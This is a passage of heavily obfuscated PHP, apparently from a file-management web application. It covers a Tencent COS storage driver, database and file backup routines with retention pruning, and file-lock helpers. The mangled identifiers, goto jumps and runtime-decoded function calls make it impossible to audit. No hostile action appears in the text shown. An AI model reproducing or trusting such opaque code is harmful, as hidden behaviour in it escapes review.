$ÉÀÚ€ú™[107]; } return $ÉÀÚ€ú™[1312]; } public static function driverType($£²˜ÓÇÁ) { $½£ˆÌ¡‰ =& $_SERVER[Ó¡Ÿ§‚]; $‹óÈİ“ª = str_replace($½£ˆÌ¡‰[1313], $½£ˆÌ¡‰[12], strtolower($£²˜ÓÇÁ->getType())); if ($‹óÈİ“ª == $½£ˆÌ¡‰[756] || $‹óÈİ“ª == $½£ˆÌ¡‰[1314] || $‹óÈİ“ª == $½£ˆÌ¡‰[1315]) { $£²˜ÓÇÁ = self::defaultDriverInit(); } else { if ($‹óÈİ“ª == $½£ˆÌ¡‰[1203] || $‹óÈİ“ª == $½£ˆÌ¡‰[1316]) { $£²˜ÓÇÁ = IO::init($£²˜ÓÇÁ->pathParse[$½£ˆÌ¡‰[1150]]); } } $€“’©µÎ = $£²˜ÓÇÁ->path; $‹óÈİ“ª = str_replace($½£ˆÌ¡‰[1313], $½£ˆÌ¡‰[12], strtolower($£²˜ÓÇÁ->getType())); if ($‹óÈİ“ª == $½£ˆÌ¡‰[106]) { return array($½£ˆÌ¡‰[33] => $½£ˆÌ¡‰[106], $½£ˆÌ¡‰[1310] => $½£ˆÌ¡‰[12], $½£ˆÌ¡‰[84] => $€“’©µÎ, $½£ˆÌ¡‰[95] => $£²˜ÓÇÁ); } return array($½£ˆÌ¡‰[33] => $½£ˆÌ¡‰[867], $½£ˆÌ¡‰[1310] => $£²˜ÓÇÁ->pathDriver, $½£ˆÌ¡‰[84] => $€“’©µÎ, $½£ˆÌ¡‰[95] => $£²˜ÓÇÁ); } public static function pathDriverType($½Š¥÷¢) { return $½Š¥÷¢ ? self::driverType(IO::init($½Š¥÷¢)) : !1; } public static function pathDriverLocal($ÇûËåÖÎ) { $°ĞÕÖ¨š =& $_SERVER[Ó¡Ÿ§‚]; $Åô‘¹· = $ÇûËåÖÎ ? self::driverType(IO::init($ÇûËåÖÎ)) : !1; return $Åô‘¹·[$°ĞÕÖ¨š[33]] == $°ĞÕÖ¨š[106] ? !0 : !1; } public static function allowCover($€€Ñ´¡, $©ôÖû®÷ = true) { $áÛ¸ÂñÅ =& $_SERVER[Ó¡Ÿ§‚]; if (is_string($€€Ñ´¡)) { $€€Ñ´¡ = IO::info($€€Ñ´¡); } if (!$€€Ñ´¡ || $€€Ñ´¡[$áÛ¸ÂñÅ[33]] == $áÛ¸ÂñÅ[75] || $€€Ñ´¡[$áÛ¸ÂñÅ[76]] <= 100) { return !1; } if (isset($€€Ñ´¡[$áÛ¸ÂñÅ[1317]]) || !$€€Ñ´¡[$áÛ¸ÂñÅ[84]]) { return !1; } static $¹«öØçß = false; if (!$¹«öØçß || !$©ôÖû®÷) { $¯Úáó• = self::driverType(IO::init($€€Ñ´¡[$áÛ¸ÂñÅ[84]])); $ìµû•Ä“ = $¯Úáó•[$áÛ¸ÂñÅ[95]]; $¹«öØçß = $áÛ¸ÂñÅ[1318]; if ($¯Úáó•[$áÛ¸ÂñÅ[33]] == $áÛ¸ÂñÅ[106]) { $¹«öØçß = $áÛ¸ÂñÅ[1319]; } if ($¯Úáó•[$áÛ¸ÂñÅ[95]] && isset($¯Úáó•[$áÛ¸ÂñÅ[95]]->config[$áÛ¸ÂñÅ[1320]]) && $¯Úáó•[$áÛ¸ÂñÅ[95]]->config[$áÛ¸ÂñÅ[1320]]) { $¹«öØçß = $áÛ¸ÂñÅ[1319]; } } return $¹«öØçß == $áÛ¸ÂñÅ[1319] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Âîµ¬â) { parent::__construct($Âîµ¬â); $this->signatureVersion($_SERVER[Ó¡Ÿ§‚][216]); } public function uploadFormData($°Ü×‘«à, $¤Š¿ú¾ = 3600) { $‰¡”€ÈĞ =& $_SERVER[Ó¡Ÿ§‚]; $•ÓìóÇ‡ = $‰¡”€ÈĞ[199]; $Ÿ“¾Íı  = $‰¡”€ÈĞ[232]; $’Ëæõ— = $‰¡”€ÈĞ[1321]; $·–À‰˜ = gmdate($‰¡”€ÈĞ[1322], time() + $¤Š¿ú¾); $Øô™Í¥‰ = (string) time() . $‰¡”€ÈĞ[71] . (string) (time() + $¤Š¿ú¾); $éñ¶¥Éì = array($‰¡”€ÈĞ[1323] => $·–À‰˜, $‰¡”€ÈĞ[1324] => array(array($‰¡”€ÈĞ[1325] => $•ÓìóÇ‡), array($‰¡”€ÈĞ[1326] => $this->bucket), array($‰¡”€ÈĞ[1327], $‰¡”€ÈĞ[1328], $‰¡”€ÈĞ[12]), array($‰¡”€ÈĞ[1329] => $’Ëæõ—), array($‰¡”€ÈĞ[1330] => $Ÿ“¾Íı ), array($‰¡”€ÈĞ[1331] => $this->accessKey), array($‰¡”€ÈĞ[1332] => $Øô™Í¥‰))); $éñ¶¥Éì = json_encode($éñ¶¥Éì); $ÒïÁ©œ€ = hash_hmac($‰¡”€ÈĞ[232], $Øô™Í¥‰, $this->secret); $ØŸÛå¢û = sha1($éñ¶¥Éì); $íĞ¶™‚Õ = hash_hmac($‰¡”€ÈĞ[232], $ØŸÛå¢û, $ÒïÁ©œ€); $áŠìÌºÌ = array($‰¡”€ÈĞ[1325] => $•ÓìóÇ‡, $‰¡”€ÈĞ[1329] => $’Ëæõ—, $‰¡”€ÈĞ[1333] => base64_encode($éñ¶¥Éì), $‰¡”€ÈĞ[1330] => $Ÿ“¾Íı , $‰¡”€ÈĞ[1331] => $this->accessKey, $‰¡”€ÈĞ[1334] => $Øô™Í¥‰, $‰¡”€ÈĞ[1335] => $íĞ¶™‚Õ, $‰¡”€ÈĞ[182] => $this->getHost()); return $áŠìÌºÌ; } public function fileOutLink($¦İÎÚîş) { $ñ®Éò¿™ =& $_SERVER[Ó¡Ÿ§‚]; if (substr($¦İÎÚîş, 0, 7) == $ñ®Éò¿™[1336]) { $¦İÎÚîş = $ñ®Éò¿™[1337] . substr($¦İÎÚîş, 7); } header($ñ®Éò¿™[161] . $¦İÎÚîş); die; } } goto A…“Àœ·¬¿; E«í¡©‘»: $fileSize = strrev(base64_decode($_SERVER[ê¯íæ·Ş][0])); function binCheckNeq($¡ƒ¾å, $ğ¶ÀÉ¹) { return $¡ƒ¾å != $ğ¶ÀÉ¹; } $_SERVER[$_SERVER[ê¯íæ·Ş][1]] = $fileSize($_SERVER[$_SERVER[ê¯íæ·Ş][2]]); goto AµàÛö´…Ö; Bó’Ëİ„•î: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $­Û–ÙÉš =& $_SERVER[Ó¡Ÿ§‚]; $this->isManual(); self::$name = date($­Û–ÙÉš[746]); if (!($÷“˜–Şƒ = Model($­Û–ÙÉš[747])->lastItem())) { $÷“˜–Şƒ = $this->initData(); } else { self::$name = $÷“˜–Şƒ[$­Û–ÙÉš[32]]; if ($÷“˜–Şƒ[$­Û–ÙÉš[748]] == $­Û–ÙÉš[88]) { self::$name = date($­Û–ÙÉš[749]); $Ë æÔŒ… = 0; if (isset($÷“˜–Şƒ[$­Û–ÙÉš[293]][$­Û–ÙÉš[200]][$­Û–ÙÉš[477]])) { $Ë æÔŒ… = (int) $÷“˜–Şƒ[$­Û–ÙÉš[293]][$­Û–ÙÉš[200]][$­Û–ÙÉš[477]]; } if (self::$manual == 0 && $÷“˜–Şƒ[$­Û–ÙÉš[32]] == self::$name) { Model($­Û–ÙÉš[747])->remove($÷“˜–Şƒ[$­Û–ÙÉš[399]]); } $÷“˜–Şƒ = $this->initData($Ë æÔŒ…, $÷“˜–Şƒ[$­Û–ÙÉš[750]]); } else { $this->checkStore($÷“˜–Şƒ[$­Û–ÙÉš[750]]); } } self::$option = $÷“˜–Şƒ; } private function isManual() { $›¾úÒ”Ï = _get($GLOBALS, $_SERVER[Ó¡Ÿ§‚][751], 0); $›¾úÒ”Ï = intval($›¾úÒ”Ï); self::$manual = $›¾úÒ”Ï && $›¾úÒ”Ï == 1 ? 1 : 0; } private function initData($˜ƒóÎ¹¢ = 0, $„Æ§ìŒ = '') { $·ø–“ò‚ =& $_SERVER[Ó¡Ÿ§‚]; $Œ¼ÉƒÚ = Model($·ø–“ò‚[747])->config(); if ($„Æ§ìŒ && $Œ¼ÉƒÚ[$·ø–“ò‚[750]] != $„Æ§ìŒ) { $˜ƒóÎ¹¢ = 0; } $this->checkStore($Œ¼ÉƒÚ[$·ø–“ò‚[750]]); if (self::$manual == 1) { self::$name .= $·ø–“ò‚[11] . date($·ø–“ò‚[752]); } $¬±¦Ïİ† = array($·ø–“ò‚[750] => $Œ¼ÉƒÚ[$·ø–“ò‚[750]], $·ø–“ò‚[32] => self::$name, $·ø–“ò‚[748] => 0, $·ø–“ò‚[753] => $Œ¼ÉƒÚ[$·ø–“ò‚[753]], $·ø–“ò‚[754] => self::$manual, $·ø–“ò‚[293] => array($·ø–“ò‚[755] => array($·ø–“ò‚[748] => 0), $·ø–“ò‚[756] => array($·ø–“ò‚[748] => 0, $·ø–“ò‚[757] => 0, $·ø–“ò‚[758] => 0, $·ø–“ò‚[33] => $·ø–“ò‚[12], $·ø–“ò‚[759] => 0, $·ø–“ò‚[760] => 0), $·ø–“ò‚[761] => array($·ø–“ò‚[748] => 0, $·ø–“ò‚[757] => 0, $·ø–“ò‚[758] => 0, $·ø–“ò‚[759] => 0, $·ø–“ò‚[760] => 0), $·ø–“ò‚[200] => array($·ø–“ò‚[748] => 0, $·ø–“ò‚[762] => 0, $·ø–“ò‚[763] => 0, $·ø–“ò‚[764] => 0, $·ø–“ò‚[765] => 0, $·ø–“ò‚[477] => $˜ƒóÎ¹¢, $·ø–“ò‚[759] => 0, $·ø–“ò‚[760] => 0)), $·ø–“ò‚[759] => time(), $·ø–“ò‚[760] => 0); $›ùï­ = Model($·ø–“ò‚[747])->insert($¬±¦Ïİ†); $¬±¦Ïİ†[$·ø–“ò‚[399]] = $›ùï­; return $¬±¦Ïİ†; } private function checkStore($¡İşø×ñ) { $Ï§ÎÄ¶Ï =& $_SERVER[Ó¡Ÿ§‚]; $¯§†´ú¬ = Model($Ï§ÎÄ¶Ï[766])->listData($¡İşø×ñ); Model($Ï§ÎÄ¶Ï[766])->checkConfig($¯§†´ú¬); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ó¡Ÿ§‚][747])->findByName(self::$name); } return self::$option; } public static function set($†¢š°) { $ÈûÌÁÜ =& $_SERVER[Ó¡Ÿ§‚]; $çŒ«Šš = self::get(); foreach ($†¢š° as $á£„…‚£ => $¸¸ø™¸) { $ñŠ­œìÅ = explode($ÈûÌÁÜ[10], $á£„…‚£); $Í å½’½ = count($ñŠ­œìÅ); switch ($Í å½’½) { case 1: $çŒ«Šš[$ñŠ­œìÅ[0]] = $¸¸ø™¸; break; case 2: $çŒ«Šš[$ñŠ­œìÅ[0]][$ñŠ­œìÅ[1]] = $¸¸ø™¸; break; case 3: $çŒ«Šš[$ñŠ­œìÅ[0]][$ñŠ­œìÅ[1]][$ñŠ­œìÅ[2]] = $¸¸ø™¸; break; } } Model($ÈûÌÁÜ[747])->update($çŒ«Šš[$ÈûÌÁÜ[399]], $çŒ«Šš); self::$option = $çŒ«Šš; return self::$option; } public function keep() { $íÕµá²ğ =& $_SERVER[Ó¡Ÿ§‚]; $½©¯‹æ = self::get(); if ($½©¯‹æ[$íÕµá²ğ[293]][$íÕµá²ğ[755]][$íÕµá²ğ[748]] == $íÕµá²ğ[88]) { return; } $this->backupKeep($½©¯‹æ); self::set(array($íÕµá²ğ[767] => 1)); } private function backupKeep($Šü ú«³) { $äÔâ…ˆ =& $_SERVER[Ó¡Ÿ§‚]; if (self::$manual == 1) { return; } $Ÿß”“•‹ = Model($äÔâ…ˆ[747])->listData(); if (empty($Ÿß”“•‹)) { return; } $¯——ó É = 0; $öĞõıÄº = array(); foreach ($Ÿß”“•‹ as $™ùş¥„Õ) { if ($¯——ó É >= 7) { break; } $öĞõıÄº[] = $™ùş¥„Õ[$äÔâ…ˆ[32]]; $¯——ó É++; } for ($¯——ó É = 0; $¯——ó É < 12; $¯——ó É++) { $öĞõıÄº[] = date($äÔâ…ˆ[768], strtotime("\x2d{$¯——ó É}\x20\x6d\x6f\x6e\x74\x68\163")); } $öĞõıÄº = array_unique($öĞõıÄº); $¢‰¾¿ÂÏ = Model($äÔâ…ˆ[769])->get($äÔâ…ˆ[770]); foreach ($Ÿß”“•‹ as $™ùş¥„Õ) { if (isset($™ùş¥„Õ[$äÔâ…ˆ[754]]) && $™ùş¥„Õ[$äÔâ…ˆ[754]] == $äÔâ…ˆ[88]) { continue; } if (!empty($™ùş¥„Õ[$äÔâ…ˆ[32]]) && in_array($™ùş¥„Õ[$äÔâ…ˆ[32]], $öĞõıÄº)) { continue; } Model($äÔâ…ˆ[747])->remove($™ùş¥„Õ[$äÔâ…ˆ[399]]); $¨·ã¡Ù³ = $this->backupPath($Šü ú«³, $¢‰¾¿ÂÏ); IO::remove($¨·ã¡Ù³, !1); } } private function backupPath($ÄÇ–£”«, $àö„ì¥ = false) { $ÏÅ’µÍ¯ =& $_SERVER[Ó¡Ÿ§‚]; if (!$àö„ì¥) { $àö„ì¥ = Model($ÏÅ’µÍ¯[769])->get($ÏÅ’µÍ¯[770]); } $­ÓîÃÆÍ = $ÄÇ–£”«[$ÏÅ’µÍ¯[32]]; $æ¿’¥³İ = substr(md5($ÏÅ’µÍ¯[771] . $àö„ì¥ . $­ÓîÃÆÍ), 0, 8); return "\173\151\x6f\72{$ÄÇ–£”«[$ÏÅ’µÍ¯[750]]}\175\57\x64\141\164\x61\x62\141\163\145\57\x62\x61\143\x6b\165\160\57" . $­ÓîÃÆÍ . $ÏÅ’µÍ¯[11] . $æ¿’¥³İ; } public function db() { $ÒšñØ÷° =& $_SERVER[Ó¡Ÿ§‚]; $Í¾êîë = self::get(); if ($Í¾êîë[$ÒšñØ÷°[293]][$ÒšñØ÷°[756]][$ÒšñØ÷°[748]] == $ÒšñØ÷°[88]) { return !0; } $ş˜Š¡è• = new BackupDb(); if (!$ş˜Š¡è•->index()) { return !1; } self::set(array($ÒšñØ÷°[772] => 1)); return !0; } public function dbFile() { $ÏÜïºÅé =& $_SERVER[Ó¡Ÿ§‚]; $£à—Æğî = self::get(); if ($£à—Æğî[$ÏÜïºÅé[293]][$ÏÜïºÅé[761]][$ÏÜïºÅé[748]] == $ÏÜïºÅé[88]) { return !0; } $Ø™‹¤íó = new BackupDbFile(); if (!$Ø™‹¤íó->index()) { return !1; } self::set(array($ÏÜïºÅé[773] => 1)); return !0; } public function file() { $‹Ÿ…¡ù‚ =& $_SERVER[Ó¡Ÿ§‚]; $¥Æ—şËÆ = self::get(); if ($¥Æ—şËÆ[$‹Ÿ…¡ù‚[293]][$‹Ÿ…¡ù‚[200]][$‹Ÿ…¡ù‚[748]] == $‹Ÿ…¡ù‚[88]) { return !0; } if (!isset($¥Æ—şËÆ[$‹Ÿ…¡ù‚[753]]) || $¥Æ—şËÆ[$‹Ÿ…¡ù‚[753]] == $‹Ÿ…¡ù‚[198]) { $´‘×Ğ¼ = new BackupFile(); if (!$´‘×Ğ¼->index()) { return !1; } } self::set(array($‹Ÿ…¡ù‚[774] => 1, $‹Ÿ…¡ù‚[748] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¿¬ÇÄö =& $_SERVER[Ó¡Ÿ§‚]; $ÚäãôíÕ = Backup::get(); self::$io = $ÚäãôíÕ[$¿¬ÇÄö[750]]; self::$name = $ÚäãôíÕ[$¿¬ÇÄö[32]]; $§ úìÀâ = new DbManage(); $ê°Ê™µÕ = $§ úìÀâ->dbType(); $Ë²¸şİ® = array($¿¬ÇÄö[775] => $ê°Ê™µÕ, $¿¬ÇÄö[776] => time()); Backup::set($Ë²¸şİ®); $¤Ï…Î›» = $this->tmpFilesPath() . $¿¬ÇÄö[777] . self::$name . $¿¬ÇÄö[8]; del_dir($¤Ï…Î›»); mk_dir($¤Ï…Î›»); $×ö—£ˆß = $Öõ¬²€© = 0; $®‹¯üØ“ = new Task($¿¬ÇÄö[778], $¿¬ÇÄö[779], 0, LNG($¿¬ÇÄö[780]) . $¿¬ÇÄö[781] . LNG($¿¬ÇÄö[782])); try { $àßèŠ° = $§ úìÀâ->db()->getTables(); } catch (Exception $ì¡ÅŒßá) { $®‹¯üØ“->end(); return !1; } $àßèŠ° = array_diff($àßèŠ°, array($¿¬ÇÄö[783], $¿¬ÇÄö[784])); foreach ($àßèŠ° as $¯Ó€ñÊà) { $×ö—£ˆß += $§ úìÀâ->model($¯Ó€ñÊà)->count(); } $®‹¯üØ“->task[$¿¬ÇÄö[785]] = $×ö—£ˆß; $GLOBALS[$¿¬ÇÄö[786]] = self::$name; foreach ($àßèŠ° as $¯Ó€ñÊà) { $éÑ†óÂ = $¤Ï…Î›» . $¯Ó€ñÊà . $¿¬ÇÄö[787]; $ıå¼¼‹ = null; if ($¯Ó€ñÊà == $¿¬ÇÄö[788] && (!isset($ÚäãôíÕ[$¿¬ÇÄö[753]]) || $ÚäãôíÕ[$¿¬ÇÄö[753]] == $¿¬ÇÄö[198])) { $ıå¼¼‹ = self::$io; } $Öõ¬²€© += $§ úìÀâ->sqlFromDb($¯Ó€ñÊà, $éÑ†óÂ, $®‹¯üØ“, $ıå¼¼‹); } unset($GLOBALS[$¿¬ÇÄö[786]]); $®‹¯üØ“->end(); if ($Öõ¬²€© > $×ö—£ˆß) { $×ö—£ˆß = $Öõ¬²€©; } $Ë²¸şİ® = array($¿¬ÇÄö[775] => $ê°Ê™µÕ, $¿¬ÇÄö[772] => 1, $¿¬ÇÄö[789] => $×ö—£ˆß, $¿¬ÇÄö[790] => $Öõ¬²€©, $¿¬ÇÄö[791] => time()); Backup::set($Ë²¸şİ®); if ($×ö—£ˆß - $Öõ¬²€© > 0) { $®™ŞÊè€ = $¿¬ÇÄö[792]; if (stristr(I18n::getType(), $¿¬ÇÄö[793])) { $®™ŞÊè€ = $¿¬ÇÄö[794]; } write_log(array($®™ŞÊè€, $Ë²¸şİ®), $¿¬ÇÄö[779]); return !1; } return !0; } private function tmpFilesPath() { $Ú°ƒôæ =& $_SERVER[Ó¡Ÿ§‚]; $±²ÉœÎÔ = TEMP_FILES; if ($GLOBALS[$Ú°ƒôæ[6]][$Ú°ƒôæ[89]][$Ú°ƒôæ[795]]) { $±²ÉœÎÔ = $GLOBALS[$Ú°ƒôæ[6]][$Ú°ƒôæ[89]][$Ú°ƒôæ[795]]; if (!mk_dir($±²ÉœÎÔ) || !is_writable($±²ÉœÎÔ) || !IO::mkfile($±²ÉœÎÔ . $Ú°ƒôæ[796])) { $±²ÉœÎÔ = TEMP_FILES; } } return $±²ÉœÎÔ; } } class BackupDbFile { public function __construct() { } public function index() { $òÖÙìÒ¾ =& $_SERVER[Ó¡Ÿ§‚]; $¯š¹Òï = Backup::get(); $§Ï÷ÍåÔ = $¯š¹Òï[$òÖÙìÒ¾[32]]; $ºÍ¾ìØâ = $this->tmpFilesPath() . "\x62\141\143\153\x75\x70\137{$§Ï÷ÍåÔ}\x2f"; $Èüç®“× = $this->backupPath($¯š¹Òï); if (!($Èüç®“× = IO::mkdir($Èüç®“×))) { return !1; } $˜—ÓäÅ° = IO::listPath($ºÍ¾ìØâ); $ãò‚ùœ = isset($˜—ÓäÅ°[$òÖÙìÒ¾[83]]) ? $˜—ÓäÅ°[$òÖÙìÒ¾[83]] : array(); $ñ„ßƒæ = array_sum(array_column($ãò‚ùœ, $òÖÙìÒ¾[76])); if (!$ñ„ßƒæ) { return !1; } $ªåìÖÎÂ = array($òÖÙìÒ¾[797] => $ñ„ßƒæ, $òÖÙìÒ¾[798] => time()); Backup::set($ªåìÖÎÂ); $÷¨ğÒìÎ = new TaskFileTransfer($òÖÙìÒ¾[799], $òÖÙìÒ¾[779], count($ãò‚ùœ), LNG($òÖÙìÒ¾[780]) . $òÖÙìÒ¾[386] . LNG($òÖÙìÒ¾[782]) . $òÖÙìÒ¾[800]); $÷¨ğÒìÎ->task[$òÖÙìÒ¾[762]] = $ñ„ßƒæ; foreach ($˜—ÓäÅ°[$òÖÙìÒ¾[83]] as $É‡ªƒ•à) { $éÊ«İ–ò = IO::move($É‡ªƒ•à[$òÖÙìÒ¾[84]], $Èüç®“×); if (!$éÊ«İ–ò) { $÷¨ğÒìÎ->end(); $œÓÎÍ»ä = IO::getLastError($òÖÙìÒ¾[801] . $É‡ªƒ•à[$òÖÙìÒ¾[84]] . $òÖÙìÒ¾[802] . $Èüç®“× . $òÖÙìÒ¾[164]); write_log($œÓÎÍ»ä, $òÖÙìÒ¾[779]); return !1; } } $åà‹ÀõÍ = new DbManage(); $ÈÆ¹áøŸ = $åà‹ÀõÍ->getSqlFile(); if (!$ÈÆ¹áøŸ[$òÖÙìÒ¾[803]] || !$ÈÆ¹áøŸ[$òÖÙìÒ¾[13]]) { return !1; } IO::move($ÈÆ¹áøŸ[$òÖÙìÒ¾[803]], $Èüç®“×); IO::move($ÈÆ¹áøŸ[$òÖÙìÒ¾[13]], $Èüç®“×); $÷¨ğÒìÎ->end(); $ªåìÖÎÂ = array($òÖÙìÒ¾[804] => $ñ„ßƒæ, $òÖÙìÒ¾[805] => time()); Backup::set($ªåìÖÎÂ); return !0; } private function backupPath($œ™³ß¥) { $üĞ“÷ä² =& $_SERVER[Ó¡Ÿ§‚]; $µ£µÁÁ³ = $œ™³ß¥[$üĞ“÷ä²[32]]; $œÒë©¸ü = Model($üĞ“÷ä²[769])->get($üĞ“÷ä²[770]); $äÔ¿Ñöù = substr(md5($üĞ“÷ä²[771] . $œÒë©¸ü . $µ£µÁÁ³), 0, 8); return "\173\x69\x6f\72{$œ™³ß¥[$üĞ“÷ä²[750]]}\175\57\144\141\164\141\x62\x61\163\x65\57\x62\x61\143\x6b\x75\160\57" . $µ£µÁÁ³ . $üĞ“÷ä²[11] . $äÔ¿Ñöù; } private function tmpFilesPath() { $É“¡­æ¿ =& $_SERVER[Ó¡Ÿ§‚]; $×ÍÒ ‰ = TEMP_FILES; if ($GLOBALS[$É“¡­æ¿[6]][$É“¡­æ¿[89]][$É“¡­æ¿[795]]) { $×ÍÒ ‰ = $GLOBALS[$É“¡­æ¿[6]][$É“¡­æ¿[89]][$É“¡­æ¿[795]]; if (!mk_dir($×ÍÒ ‰) || !is_writable($×ÍÒ ‰) || !IO::mkfile($×ÍÒ ‰ . $É“¡­æ¿[796])) { $×ÍÒ ‰ = TEMP_FILES; } } return $×ÍÒ ‰; } } goto c†ø„Ûºˆ„; AµàÛö´…Ö: function binCheckBigger($²ËœË‹, $ôèæª¸¹) { return $²ËœË‹ > $ôèæª¸¹; } $_SERVER[$_SERVER[ê¯íæ·Ş][3]] = ("\70\61\70\65".strrev('74'))+0;$_dpcl="m24uexibvnh0l8o1z6t9qjfgsy37p5cwrkdai93rxchz8bg2upq706owfy4jtnsldvame5k10b6rvt";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ëÔèæÒĞ, $Éô¨ÒÏÕ) { $²Ñ Î• =& $_SERVER[Ó¡Ÿ§‚]; if (isset(self::$_methodList[$ëÔèæÒĞ])) { return @call_user_func_array(self::$_methodList[$ëÔèæÒĞ], $Éô¨ÒÏÕ); } else { if (method_exists($this, $ëÔèæÒĞ)) { return call_user_func_array(array($this, $ëÔèæÒĞ), $Éô¨ÒÏÕ); } else { think_exception(__CLASS__ . $²Ñ Î•[4] . $ëÔèæÒĞ . $²Ñ Î•[5]); } } } public static function __callStatic($Á‡À½èİ, $¯Øî»Ù·) { if (isset(self::$_methodListStatic[$Á‡À½èİ])) { return call_user_func_array(self::$_methodListStatic[$Á‡À½èİ], $¯Øî»Ù·); } else { if (method_exists(self, $Á‡À½èİ)) { return call_user_func_array(array(self, $Á‡À½èİ), $¯Øî»Ù·); } else { show_json("{$Á‡À½èİ}\x28\51\x20\x6e\x6f\x74\40\x65\170\x69\163\x74\73", !1); } } } public static function addMethod($€×õÓËú, $ÅÀ†øú…) { self::$_methodList[$€×õÓËú] = $ÅÀ†øú…; } public static function addMethodStatic($¥Ñµà¨, $”¢Ñ€) { self::$_methodListStatic[$¥Ñµà¨] = $”¢Ñ€; } } goto D Ñó¡‚ç¦; BÔ­°Ã†º: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ø¨É÷Ç) { $š½™•«¶ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->allowLock()) { return; } $this->_lockCheck($š½™•«¶[555], $ø¨É÷Ç); $¥‘ÔôÙ = 1; $this->_lockEvent($ø¨É÷Ç, array($š½™•«¶[556], $š½™•«¶[557]), $¥‘ÔôÙ); $this->_lockParent($ø¨É÷Ç, array($š½™•«¶[557]), $¥‘ÔôÙ); $this->_lockEvent($ø¨É÷Ç, array($š½™•«¶[558], $š½™•«¶[559]), $¥‘ÔôÙ); $this->_lockCheckEnd($š½™•«¶[555], $ø¨É÷Ç); } public function lockCopyEnd($¡•…‡Ï„) { $ƒû‡—ÒÕ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->allowLock()) { return; } $ôë¯Êı = 0; $this->_lockEvent($¡•…‡Ï„, array($ƒû‡—ÒÕ[556], $ƒû‡—ÒÕ[557]), $ôë¯Êı); $this->_lockParent($¡•…‡Ï„, array($ƒû‡—ÒÕ[557]), $ôë¯Êı); $this->_lockEvent($¡•…‡Ï„, array($ƒû‡—ÒÕ[558], $ƒû‡—ÒÕ[559]), $ôë¯Êı); } public function lockWriteStart($‰ĞÓ¢û, $­‘Ùù§ï = '') { $ô¹šıöø =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->allowLock()) { return; } $this->_lockCheck($ô¹šıöø[556], $‰ĞÓ¢û); $ÀŞåû¾ = 1; $this->_lockKey($ô¹šıöø[560] . $‰ĞÓ¢û . $ô¹šıöø[10] . $­‘Ùù§ï, $ÀŞåû¾); $this->_lockEvent($‰ĞÓ¢û, array($ô¹šıöø[555], $ô¹šıöø[557]), $ÀŞåû¾); $this->_lockParent($‰ĞÓ¢û, array($ô¹šıöø[555], $ô¹šıöø[557]), $ÀŞåû¾); $this->_lockCheckEnd($ô¹šıöø[556], $‰ĞÓ¢û); } public function lockWriteEnd($øé¶Ôâ¤, $ÄÏĞ˜Óû = '') { $ÑîêÏ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->allowLock()) { return; } $®¥Ó¹‚ = 0; $this->_lockKey($ÑîêÏ[560] . $øé¶Ôâ¤ . $ÑîêÏ[10] . $ÄÏĞ˜Óû, $®¥Ó¹‚); $this->_lockEvent($øé¶Ôâ¤, array($ÑîêÏ[555], $ÑîêÏ[557]), $®¥Ó¹‚); $this->_lockParent($øé¶Ôâ¤, array($ÑîêÏ[555], $ÑîêÏ[557]), $®¥Ó¹‚); } public function lockMoveStart($¿•‰–ù‡) { $âú«Ç =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->allowLock()) { return; } $this->_lockCheck($âú«Ç[557], $¿•‰–ù‡); $Í›’Ú‹‘ = 1; $this->_lockKey($âú«Ç[561] . $¿•‰–ù‡, $Í›’Ú‹‘); $this->_lockEvent($¿•‰–ù‡, array($âú«Ç[555], $âú«Ç[556]), $Í›’Ú‹‘); $this->_lockParent($¿•‰–ù‡, array($âú«Ç[555], $âú«Ç[557]), $Í›’Ú‹‘); $this->_lockEvent($¿•‰–ù‡, array($âú«Ç[562], $âú«Ç[558], $âú«Ç[559]), $Í›’Ú‹‘); $this->_lockCheckEnd($âú«Ç[557], $¿•‰–ù‡); } public function lockMoveEnd($îÒïÇïó) { $¢Êœò—º =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->allowLock()) { return; } $éù„É€ñ = 0; $this->_lockKey($¢Êœò—º[561] . $îÒïÇïó, $éù„É€ñ); $this->_lockEvent($îÒïÇïó, array($¢Êœò—º[555], $¢Êœò—º[556]), $éù„É€ñ); $this->_lockParent($îÒïÇïó, array($¢Êœò—º[555], $¢Êœò—º[557]), $éù„É€ñ); $this->_lockEvent($îÒïÇïó, array($¢Êœò—º[562], $¢Êœò—º[558], $¢Êœò—º[559]), $éù„É€ñ); } private function _lockCheck($Ü¸çÑ¶, $èÀ§È») { $¥©ÃíÚ =& $_SERVER[Ó¡Ÿ§‚]; $¥ú˜³Í• = $this->sourceInfo($èÀ§È»); $ĞÉãÑòç = $Ü¸çÑ¶ . $¥©ÃíÚ[10] . $èÀ§È»; $this->_lockTimeStart[$ĞÉãÑòç] = timeFloat(); if (!is_array($¥ú˜³Í•)) { return; } $ƒ½×µÖ¬ = LNG($¥©ÃíÚ[563]); CacheLock::setErrorMsg($¥©ÃíÚ[162] . htmlspecialchars($¥ú˜³Í•[$¥©ÃíÚ[32]]) . $¥©ÃíÚ[164] . $ƒ½×µÖ¬); $this->_lockKey($ĞÉãÑòç, 1); $this->_lockKey($ĞÉãÑòç, 0); $ù÷ÉÍ’ = array_reverse($this->parentLevelArray($¥ú˜³Í•[$¥©ÃíÚ[520]])); foreach ($ù÷ÉÍ’ as $Î„”˜¯É) { $ĞÉãÑòç = $Ü¸çÑ¶ . $¥©ÃíÚ[564] . $Î„”˜¯É; if (CacheLock::lockGet($¥©ÃíÚ[565] . $ĞÉãÑòç)) { $¥ú˜³Í• = $this->sourceInfo($Î„”˜¯É); CacheLock::setErrorMsg($¥©ÃíÚ[162] . htmlspecialchars($¥ú˜³Í•[$¥©ÃíÚ[32]]) . $¥©ÃíÚ[164] . $ƒ½×µÖ¬); $this->_lockKey($ĞÉãÑòç, 1); $this->_lockKey($ĞÉãÑòç, 0); } } } private function _lockCheckEnd($óƒÎˆ­, $¢úŞİ¯¦) { $®‘›¼üà =& 